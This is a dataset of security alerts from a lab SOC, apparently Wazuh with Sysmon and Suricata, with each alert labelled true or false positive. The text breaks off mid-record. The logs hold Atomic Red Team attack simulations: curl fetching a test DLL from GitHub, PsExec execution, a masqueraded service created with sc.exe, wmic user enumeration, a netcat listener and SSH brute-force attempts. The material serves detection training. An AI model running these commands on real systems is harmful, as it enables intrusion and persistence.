RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 09:36:23.983
ProcessGuid: {6a97c67b-a097-6867-2102-000000000a00}
ProcessId: 2156
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17763.1697 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: c:\windows\system32\cmd.exe
CurrentDirectory: C:\Users\vboxuser\
User: SOCLAB\vboxuser
LogonGuid: {6a97c67b-a097-6867-151d-a10000000000}
LogonId: 0xA11D15
TerminalSessionId: 0
IntegrityLevel: High
Hashes: SHA1=DED8FD7F36417F66EB6ADA10E0C0D7C0022986E9,MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {6a97c67b-a097-6867-2002-000000000a00}
ParentProcessId: 272
ParentImage: C:\Windows\System32\conhost.exe
ParentCommandLine: C:\Windows\system32\conhost.exe --headless --width 80 --height 24 --signal 0x1f0 -- ""c:\windows\system32\cmd.exe""
ParentUser: SOCLAB\vboxuser"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\MicrosoftEdgeElevationService\\ImagePath binary is: \""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\138.0.3351.65\\elevation_service.exe\"" 3 Low Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\MicrosoftEdgeElevationService\\ImagePath binary is: \""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\138.0.3351.65\\elevation_service.exe\"" 92307 sysmon sysmon_eid13_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\system32\\services.exe NT AUTHORITY\\SYSTEM ""Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2025-07-03 09:03:38.506
ProcessGuid: {ff3427f9-3a61-6866-0b00-000000001200}
ProcessId: 904
Image: C:\WINDOWS\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\MicrosoftEdgeElevationService\ImagePath
Details: ""C:\Program Files (x86)\Microsoft\Edge\Application\138.0.3351.65\elevation_service.exe""
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"netcat listening for incoming connections. 7 Medium netcat listening for incoming connections. 100051 ossec process_monitor ossec Linux-Server ossec: output: 'process list':
    PID USER     COMMAND
      1 root     /sbin/init splash noprompt noshell automatic-ubiquity
      2 root     [kthreadd]
      3 root     [pool_workqueue_release]
      4 root     [kworker/R-rcu_g]
      5 root     [kworker/R-rcu_p]
      6 root     [kworker/R-slub_]
      7 root     [kworker/R-netns]
     10 root     [kworker/0:0H-events_highpri]
     11 root     [kworker/u8:0-ext4-rsv-conversion]
     12 root     [kworker/R-mm_pe]
     13 root     [rcu_tasks_kthread]
     14 root     [rcu_tasks_rude_kthread]
     15 root     [rcu_tasks_trace_kthread]
     16 root     [ksoftirqd/0]
     17 root     [rcu_preempt]
     18 root     [migration/0]
     19 root     [idle_inject/0]
     20 root     [cpuhp/0]
     21 root     [cpuhp/1]
     22 root     [idle_inject/1]
     23 root     [migration/1]
     24 root     [ksoftirqd/1]
     25 root     [kworker/1:0-cgroup_destroy]
     26 root     [kworker/1:0H-kblockd]
     27 root     [cpuhp/2]
     28 root     [idle_inject/2]
     29 root     [migration/2]
     30 root     [ksoftirqd/2]
     32 root     [kworker/2:0H-events_highpri]
     33 root     [cpuhp/3]
     34 root     [idle_inject/3]
     35 root     [migration/3]
     36 root     [ksoftirqd/3]
     37 root     [kworker/3:0-cgroup_destroy]
     38 root     [kworker/3:0H-kblockd]
     40 root     [kworker/u10:0-events_power_efficient]
     41 root     [kworker/u11:0-events_power_efficient]
     43 root     [kdevtmpfs]
     44 root     [kworker/R-inet_]
     45 root     [kauditd]
     46 root     [kworker/u9:1-flush-8:0]
     47 root     [khungtaskd]
     48 root     [oom_reaper]
     49 root     [kworker/u12:1-events_power_efficient]
     50 root     [kworker/R-write]
     51 root     [kcompactd0]
     52 root     [ksmd]
     54 root     [kworker/R-kinte]
     55 root     [kworker/R-kbloc]
     56 root     [kworker/R-blkcg]
     57 root     [irq/9-acpi]
     59 root     [kworker/R-tpm_d]
     60 root     [kworker/R-ata_s]
     61 root     [kworker/R-md]
     62 root     [kworker/R-md_bi]
     63 root     [kworker/R-edac-]
     64 root     [kworker/R-devfr]
     65 root     [watchdogd]
     66 root     [kworker/3:1H-kblockd]
     67 root     [kswapd0]
     68 root     [ecryptfs-kthread]
     69 root     [kworker/R-kthro]
     70 root     [kworker/R-acpi_]
     71 root     [kworker/u12:2-events_power_efficient]
     73 root     [kworker/2:1-cgroup_destroy]
     74 root     [scsi_eh_0]
     75 root     [kworker/R-scsi_]
     76 root     [scsi_eh_1]
     77 root     [kworker/R-scsi_]
     78 root     [kworker/u12:3-events_unbound]
     80 root     [kworker/R-mld]
     81 root     [kworker/R-ipv6_]
     88 root     [kworker/R-kstrp]
     90 root     [kworker/u13:0]
     91 root     [kworker/u14:0]
     92 root     [kworker/u15:0]
     93 root     [kworker/u16:0]
     94 root     [kworker/u17:0]
     98 root     [kworker/u10:1-flush-8:0]
    100 root     [kworker/R-crypt]
    102 root     [kworker/1:1H-kblockd]
    112 root     [kworker/R-charg]
    137 root     [kworker/0:1H-kblockd]
    151 root     [kworker/2:1H-kblockd]
    154 root     [scsi_eh_2]
    155 root     [kworker/R-scsi_]
    156 root     [kworker/u9:2-events_unbound]
    177 root     [kworker/u9:3-events_power_efficient]
    191 root     [kworker/u11:2-flush-8:0]
    209 root     [kworker/R-raid5]
    253 root     [jbd2/sda2-8]
    254 root     [kworker/R-ext4-]
    287 root     [kworker/2:2-events]
    320 root     /usr/lib/systemd/systemd-journald
    362 root     [kworker/R-kmpat]
    363 root     [kworker/R-kmpat]
    372 root     /sbin/multipathd -d -s
    375 root     [kworker/u10:2-events_power_efficient]
    379 root     [kworker/1:3-cgroup_destroy]
    380 root     /usr/lib/systemd/systemd-udevd
    386 root     [kworker/u8:1-ext4-rsv-conversion]
    438 root     [psimon]
    465 systemd+ /usr/lib/systemd/systemd-resolved
    478 systemd+ /usr/lib/systemd/systemd-timesyncd
    590 root     [kworker/0:3-events]
    652 message+ @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
    671 polkitd  /usr/lib/polkit-1/polkitd --no-debug
    682 root     /usr/lib/systemd/systemd-logind
    684 root     /usr/libexec/udisks2/udisksd
    716 systemd+ /usr/lib/systemd/systemd-networkd
    719 syslog   /usr/sbin/rsyslogd -n -iNONE
    731 root     [irq/18-vmwgfx]
    732 root     [kworker/R-ttm]
    756 root     /usr/sbin/ModemManager
    822 root     [kworker/R-cfg80]
    844 root     /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
    935 mysql    /usr/sbin/mariadbd
   1017 root     /usr/sbin/cron -f -P
   1044 root     sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
   1053 root     /sbin/agetty -o -p -- \u --noclear - linux
   1055 root     /usr/sbin/apache2 -k start
   1080 www-data /usr/sbin/apache2 -k start
   1081 www-data /usr/sbin/apache2 -k start
   1082 www-data /usr/sbin/apache2 -k start
   1083 www-data /usr/sbin/apache2 -k start
   1084 www-data /usr/sbin/apache2 -k start
   2315 root     sshd: vboxuser [priv]
   2318 root     [psimon]
   2320 vboxuser /usr/lib/systemd/systemd --user
   2321 vboxuser (sd-pam)
   2410 vboxuser sshd: vboxuser@pts/0
   2411 vboxuser -bash
   2452 root     [kworker/u11:1-events_power_efficient]
   3323 root     [kworker/0:1-cgroup_destroy]
   3738 root     [kworker/3:1-mm_percpu_wq]
   5175 root     [kworker/u9:0-events_unbound]
   5181 root     sudo su
   5182 root     sudo su
   5183 root     su
   5184 root     bash
   5192 root     [kworker/u11:3-flush-8:0]
   5244 root     [kworker/1:1-cgwb_release]
   5247 root     [kworker/1:2-events]
   5345 root     /var/ossec/bin/wazuh-execd
   5356 wazuh    /var/ossec/bin/wazuh-agentd
   5370 root     /var/ossec/bin/wazuh-syscheckd
   5380 root     /var/ossec/bin/wazuh-logcollector
   5394 root     /var/ossec/bin/wazuh-modulesd
   6192 root     [kworker/0:0-cgroup_destroy]
   6413 root     nc -l 8000
   6630 root     sh -c -- ps -e -o pid,uname,command
   6631 root     ps -e -o pid,uname,command process list",1,TP
Maximum authentication attempts exceeded. 8 Medium Maximum authentication attempts exceeded. 5758 syslog sshd authentication_failed sshd Linux-Server Jul 08 19:23:30 Linux-Server sshd[2858]: error: maximum authentication attempts exceeded for invalid user top-usernames-shortlist.txt from 10.0.2.8 port 51034 ssh2 [preauth] journald,1,TP
"Powershell process spawned Windows command shell instance 4 Low Powershell process spawned Windows command shell instance 92004 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""C:\\WINDOWS\\system32\\cmd.exe\"" /c \""wmic \tcsproduct \tget UUID\"" \""powershell.exe\"" &amp; {cmd.exe /c \\\""\""wmic \tcsproduct \tget UUID\\\""\""  cmd.exe /c \\\""\""fsutil behavior \tset SymlinkEvaluation R2L:1\\\""\""  cmd.exe /c \\\""\""fsutil behavior set \tSymlinkEvaluation R2R:1\\\""\"" reg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f       copy \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\PsExec.exe\\\""\"" $env:temp cmd.exe /c \\\""\""$env:temp\\psexec.exe  -accepteula  \\\\$ENV:COMPUTERNAME cmd.exe  /c echo \\\""\""--access-token\\\""\""\\\""\""} C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 20:40:46.325
ProcessGuid: {ff3427f9-3c4e-6868-d603-000000001400}
ProcessId: 8044
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\WINDOWS\system32\cmd.exe"" /c ""wmic 	csproduct 	get UUID""
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-3c4d-6868-d403-000000001400}
ParentProcessId: 7260
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {cmd.exe /c \""""wmic 	csproduct 	get UUID\"""" 
cmd.exe /c \""""fsutil behavior 	set SymlinkEvaluation R2L:1\"""" 
cmd.exe /c \""""fsutil behavior set 	SymlinkEvaluation R2R:1\""""
reg    add    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      
copy \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\PsExec.exe\"""" $env:temp
cmd.exe /c \""""$env:temp\psexec.exe  -accepteula  \\$ENV:COMPUTERNAME cmd.exe  /c echo \""""--access-token\""""\""""}
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client sc.exe  create \""WerFaultSvc\"" binPath= \""$env:windir\\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe\"" DisplayName= \""WerFault Service\"" start= auto \""cmd.exe\"" /c sc.exe create \""WerFaultSvc\"" binPath= \""$env:windir\\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe\"" DisplayName= \""WerFault Service\"" start= auto C:\\Windows\\System32\\sc.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 20:40:56.101
ProcessGuid: {ff3427f9-3c58-6868-e803-000000001400}
ProcessId: 6180
Image: C:\Windows\System32\sc.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: Service Control Manager Configuration Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: sc.exe
CommandLine: sc.exe  create ""WerFaultSvc"" binPath= ""$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe"" DisplayName= ""WerFault Service"" start= auto
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=9D1597B49F057FACF972D22BD498425E3B90BC62,MD5=9C210CDD9F05530777868F4C8530C438,SHA256=845607864FC7E60304D8C45AE42884B32710781DAA33DA9D01416C77D2E0BE1D,IMPHASH=42DADBD60BBC453DD1773FDC089E19B7
ParentProcessGuid: {ff3427f9-3c58-6868-e603-000000001400}
ParentProcessId: 8568
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c sc.exe create ""WerFaultSvc"" binPath= ""$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe"" DisplayName= ""WerFault Service"" start= auto
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"curl.exe launched with commands to create a binary file 12 High curl.exe launched with commands to create a binary file 92074 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client C:\\Windows\\System32\\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll \""cmd.exe\"" /c C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll &amp; C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\users\\public\\music\\allthethingsx64.dll &amp; C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\programdata\\allthethingsx64.dll &amp; C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\\allthethingsx64.dll C:\\Windows\\System32\\curl.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 21:47:35.582
ProcessGuid: {ff3427f9-4bf7-6868-0a06-000000001400}
ProcessId: 272
Image: C:\Windows\System32\curl.exe
FileVersion: 8.13.0
Description: The curl executable
Product: The curl executable
Company: curl, https://curl.se/
OriginalFileName: curl.exe
CommandLine: C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll 
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=A1BD7848E36F22021C68F4F24EDFDB7ACE42FCA3,MD5=90939B67542D77A32042B7C1945623B1,SHA256=3345339164CF384EFF527B6C3160FEA8D849A4231EC6CA80513E3A739E505168,IMPHASH=6C25E5A258C8C037CD5FBE44B10E696F
ParentProcessGuid: {ff3427f9-4bf5-6868-0706-000000001400}
ParentProcessId: 2724
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Powershell process spawned Windows command shell instance 4 Low Powershell process spawned Windows command shell instance 92004 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""C:\\WINDOWS\\system32\\cmd.exe\"" /c \""for /l %%x in (1,1,75) do start wordpad.exe /p C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\T1059_003note.txt\"" \""powershell.exe\"" &amp; {cmd /c \\\""\""for /l %x in (1,1,75) do start wordpad.exe /p C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\T1059_003note.txt\\\""\"" | out-null} C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 19:08:28.189
ProcessGuid: {ff3427f9-26ac-6868-0902-000000001400}
ProcessId: 9076
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\WINDOWS\system32\cmd.exe"" /c ""for /l %%x in (1,1,75) do start wordpad.exe /p C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1059_003note.txt""
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-26ab-6868-0702-000000001400}
ParentProcessId: 10212
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {cmd /c \""""for /l %x in (1,1,75) do start wordpad.exe /p C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1059_003note.txt\"""" | out-null}
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
Successful sudo to ROOT executed. 3 Low Successful sudo to ROOT executed. 5402 syslog sudo sudo Linux-Server Jul 04 15:28:33 Linux-Server sudo[2675]: vboxuser : TTY=pts/0 ; PWD=/home/vboxuser ; USER=root ; COMMAND=/usr/bin/apt install htop journald,0,FP
"Logon Failure - Unknown user or bad password 5 Low Logon Failure - Unknown user or bad password 60122 windows windows_security authentication_failed windows_eventchannel WinSrv2019 ""An account failed to log on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Type:			3

Account For Which Logon Failed:
	Security ID:		S-1-0-0
	Account Name:		user
	Account Domain:		

Failure Information:
	Failure Reason:		Unknown user name or bad password.
	Status:			0xC000006D
	Sub Status:		0xC0000064

Process Information:
	Caller Process ID:	0x0
	Caller Process Name:	-

Network Information:
	Workstation Name:	-
	Source Network Address:	10.0.2.8
	Source Port:		37114

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon request fails. It is generated on the computer where access was attempted.

The Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).

The Process Information fields indicate which account and process on the system requested the logon.

The Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The authentication information fields provide detailed information about this specific logon request.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."" AUDIT_FAILURE Microsoft-Windows-Security-Auditing Security EventChannel",1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client wmic  useraccount get /ALL /format:csv \""cmd.exe\"" /c wmic useraccount get /ALL /format:csv C:\\Windows\\System32\\wbem\\WMIC.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 21:26:57.204
ProcessGuid: {ff3427f9-4721-6868-ba04-000000001400}
ProcessId: 7912
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: wmic  useraccount get /ALL /format:csv
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=D5AE0D13127AE8A7F872F5F3A835D6E217C44A86,MD5=76739CA32A2D852E9953BFC5AD0FDC08,SHA256=9C439179991319D1C6BE5ECD50C01738F9DE6B5EE9E8702FEE612E725C086F9F,IMPHASH=43C6BE584D77B658A53A9A5C606724DD
ParentProcessGuid: {ff3427f9-4721-6868-b804-000000001400}
ParentProcessId: 9880
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c wmic useraccount get /ALL /format:csv
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
Suricata: Alert - ET USER_AGENTS WinRM User Agent Detected - Possible Lateral Movement 3 Low Suricata: Alert - ET USER_AGENTS WinRM User Agent Detected - Possible Lateral Movement 86601 ids suricata json Suricata /var/log/suricata/eve.json,0,FP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client powershell.exe  -EncodedCommand \""QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAKAAoAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAKAHsACgAgACAAJABQAG8AcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAEMAdQByAHMAbwByAF0AOgA6AFAAbwBzAGkAdABpAG8AbgAKACAAIAAkAHgAIAA9ACAAKAAkAHAAbwBzAC4AWAAgACUAIAA1ADAAMAApACAAKwAgADEACgAgACAAJAB5ACAAPQAgACgAJABwAG8AcwAuAFkAIAAlACAANQAwADAAKQAgACsAIAAxAAoAIAAgAFsAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4AQwB1AHIAcwBvAHIAXQA6ADoAUABvAHMAaQB0AGkAbwBuACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBQAG8AaQBuAHQAKAAkAHgALAAgACQAeQApAAoAIAAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADEAMAAKAH0A\"" -noExit C:\\WINDOWS\\system32\\cmd.exe /c \""\""C:\\Users\\snell\\Downloads\\mouse_mover.bat\"" \"" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-03 08:29:36.593
ProcessGuid: {ff3427f9-3f70-6866-f801-000000001200}
ProcessId: 6448
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe  -EncodedCommand ""QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAKAAoAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAKAHsACgAgACAAJABQAG8AcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAEMAdQByAHMAbwByAF0AOgA6AFAAbwBzAGkAdABpAG8AbgAKACAAIAAkAHgAIAA9ACAAKAAkAHAAbwBzAC4AWAAgACUAIAA1ADAAMAApACAAKwAgADEACgAgACAAJAB5ACAAPQAgACgAJABwAG8AcwAuAFkAIAAlACAANQAwADAAKQAgACsAIAAxAAoAIAAgAFsAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4AQwB1AHIAcwBvAHIAXQA6ADoAUABvAHMAaQB0AGkAbwBuACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBQAG8AaQBuAHQAKAAkAHgALAAgACQAeQApAAoAIAAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADEAMAAKAH0A"" -noExit
CurrentDirectory: C:\Users\snell\Downloads\
User: SOCLAB\snell
LogonGuid: {ff3427f9-3beb-6866-f2e1-1c0000000000}
LogonId: 0x1CE1F2
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {ff3427f9-3f6e-6866-f101-000000001200}
ParentProcessId: 9152
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\WINDOWS\system32\cmd.exe /c """"C:\Users\snell\Downloads\mouse_mover.bat"" ""
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Powershell was used to delete files or directories 3 Low Powershell was used to delete files or directories 92021 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client powershell.exe  iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile C:\\Users\\snell\\AppData\\Local\\Temp\\Atomic-license.txt \""cmd.exe\"" /c powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\\Atomic-license.txt C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
